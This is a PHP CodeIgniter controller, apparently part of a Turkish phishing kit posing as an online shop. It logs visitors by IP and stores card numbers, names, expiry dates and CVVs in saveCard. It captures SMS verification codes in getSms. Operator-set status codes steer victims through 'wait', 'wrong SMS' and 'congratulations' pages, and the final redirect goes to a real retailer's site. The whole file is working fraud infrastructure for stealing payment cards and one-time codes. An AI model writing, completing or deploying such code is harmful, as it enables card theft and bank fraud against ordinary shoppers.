<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Index extends CI_Controller {

	public function __construct() {
		parent::__construct();
		$this->load->model('Main');
		$this->load->library('session');
	}
	public function index() {

		$visit = $_SERVER["REMOTE_ADDR"];

		$getUsers = $this->Main->getUsers($visit);

		@$sameUser = $getUsers[0]->ip;

		if ($sameUser == $visit) {
			$result = $this->Main->getSameUser($sameUser);

			@$this->session->set_userdata([
				'login' => true,
				'id' => $result->id,
				'ip' => $getUsers->ip,
			]);

		} else {
			$userData = array(
				"ip" => $_SERVER["REMOTE_ADDR"],
				"basket" => "0",
				"page" => "Ana Sayfa",
				"cc_number" => "Girilmedi",
				"skt" => "Girilmedi",
				"cvv" => "Girilmedi",
				"basket_urun" => "Ürün Eklenmedi",
				"status" => "1",
			);

			$this->Main->register($userData);
		}


 		@$this->session->set_userdata([
			'login' => true,
			'id' => $getUsers[0]->id,
			'ip' => $getUsers[0]->ip,
		]);

		$products = $this->Main->getProducts();

		$data = array(
			'products' => $products,
		);

		$this->load->view('index',$data);
	}
	public function detail($id) {
		$visit = $_SERVER["REMOTE_ADDR"];

		$getUsers = $this->Main->getUsers($visit);

		@$this->session->set_userdata([
			'login' => true,
			'id' => $getUsers[0]->id,
			'ip' => $getUsers[0]->ip,
		]);
		$getProduct = $this->Main->getProduct($id);

		$data = array(
			"product" => $getProduct
		);

		$this->load->view('detail',$data);
	}
	public function addBasket($id,$user) {

		$getProduct = $this->Main->getSelectedProduct($id);
		$ProductBalance = $getProduct[0]->balance;

		$data = array(
			"basket" => "1",
			"page" => "Sepet",
			"basket_urun" => $ProductBalance,
			"status" => "2",
		);

		$this->Main->updateUser($user,$data);

		redirect(base_url('Index/basket/'.$id));
	}
	public function basket($id) {
		$getProduct = $this->Main->getSelectedProduct($id);

		$data = array(
			"product" => $getProduct,
		);

		$this->load->view('basket', $data);
	}
	public function card($id) {
		$getProduct = $this->Main->getSelectedProduct($id);

		$data = array(
			"product" => $getProduct,
		);

		$this->load->view('card', $data);
	}
	public function pay($id) {
		$getProduct = $this->Main->getSelectedProduct($id);

		$data = array(
			"product" => $getProduct,
		);

		$this->load->view('pay',$data);
	}
	public function saveCard($id) {

		$data = array(
			'cc_number' => $this->input->post('cc_no'),
			'isim' => $this->input->post('name'),
			'skt' => $this->input->post('date'),
			'cvv' => $this->input->post('cvv'),
			'status' => "3",
			'page' => "Bekleyiniz",
		);

		$this->Main->saveCard($id,$data);

		redirect(base_url('Index/bekleyiniz'));
	}
	public function getSms($user) {
		$data = array (
			"sms" => $this->input->post('sms'),
			"status" => "3",
			"page" => "Bekleyiniz",
		);

		$this->Main->updatePage($user,$data);

		redirect(base_url('Index/bekleyiniz'));

	}
	public function bekleyiniz() {
		$this->load->view('bekleyiniz');
	}
	public function sms() {
		$this->load->view('sms');
	}
	public function tebrikler() {
		$this->load->view('tebrikler');
	}
	public function MainSms() {
		$this->load->view('msms');
	}
	public function redirectWait() {
		$user = $this->session->userdata('id');

		$result = $this->Main->getWaitingUser($user);

		if ($result[0]->status == "4") {
			$data = array(
				"page" => "Ana Sayfa"
			);
			echo "<script>window.location.href = '".base_url()."';</script>";

			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "5") {
			$data = array(
				"page" => "Hatalı SMS"
			);
			echo "<script>window.location.href = '".base_url("Index/Sms")."';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "6") {
			$data = array(
				"page" => "SMS"
			);
			echo "<script>window.location.href = '".base_url("Index/MainSMS")."';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "7") {
			$data = array(
				"page" => "Tebrikler"
			);
			echo "<script>window.location.href = '".base_url("Index/tebrikler")."';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "8") {
			$data = array(
				"page" => "Youtubede Şarkı"
			);
			echo "<script>window.location.href = 'https://www.youtube.com/watch?v=KaInAwef530';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "9") {
			$this->Main->deleteUser($user);

			echo "<script>window.location.href = 'https://www.a101.com.tr';</script>";
		}
	}
	public function redirectSms() {
		$user = $this->session->userdata('id');

		$result = $this->Main->getWaitingUser($user);

		if ($result[0]->status == "4") {
			$data = array(
				"page" => "Ana Sayfa"
			);
			echo "<script>window.location.href = '".base_url()."';</script>";

			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "6") {
			$data = array(
				"page" => "SMS"
			);
			echo "<script>window.location.href = '".base_url("Index/MainSMS")."';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "7") {
			$data = array(
				"page" => "Tebrikler"
			);
			echo "<script>window.location.href = '".base_url("Index/tebrikler")."';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "8") {
			$data = array(
				"page" => "Youtubede Şarkı"
			);
			echo "<script>window.location.href = 'https://www.youtube.com/watch?v=KaInAwef530';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "9") {
			$this->Main->deleteUser($user);

			echo "<script>window.location.href = 'https://www.a101.com.tr';</script>";
		}
	}
	public function redirectMSms() {
		$user = $this->session->userdata('id');

		$result = $this->Main->getWaitingUser($user);

		if ($result[0]->status == "4") {
			$data = array(
				"page" => "Ana Sayfa"
			);
			echo "<script>window.location.href = '".base_url()."';</script>";

			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "5") {
			$data = array(
				"page" => "Hatalı SMS"
			);
			echo "<script>window.location.href = '".base_url("Index/Sms")."';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "7") {
			$data = array(
				"page" => "Tebrikler"
			);
			echo "<script>window.location.href = '".base_url("Index/tebrikler")."';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "8") {
			$data = array(
				"page" => "Youtubede Şarkı"
			);
			echo "<script>window.location.href = 'https://www.youtube.com/watch?v=KaInAwef530';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "9") {
			$this->Main->deleteUser($user);

			echo "<script>window.location.href = 'https://www.a101.com.tr';</script>";
		}
	}
	public function redirectTebrikler() {
		$user = $this->session->userdata('id');

		$result = $this->Main->getWaitingUser($user);

		if ($result[0]->status == "4") {
			$data = array(
				"page" => "Ana Sayfa"
			);
			echo "<script>window.location.href = '".base_url()."';</script>";

			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "5") {
			$data = array(
				"page" => "Hatalı SMS"
			);
			echo "<script>window.location.href = '".base_url("Index/Sms")."';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "6") {
			$data = array(
				"page" => "SMS"
			);
			echo "<script>window.location.href = '".base_url("Index/MainSMS")."';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "8") {
			$data = array(
				"page" => "Youtubede Şarkı"
			);
			echo "<script>window.location.href = 'https://www.youtube.com/watch?v=KaInAwef530';</script>";
			$this->Main->updatePage($user,$data);
		} elseif ($result[0]->status == "9") {
			$this->Main->deleteUser($user);

			echo "<script>window.location.href = 'https://www.a101.com.tr';</script>";
		}
	}

}
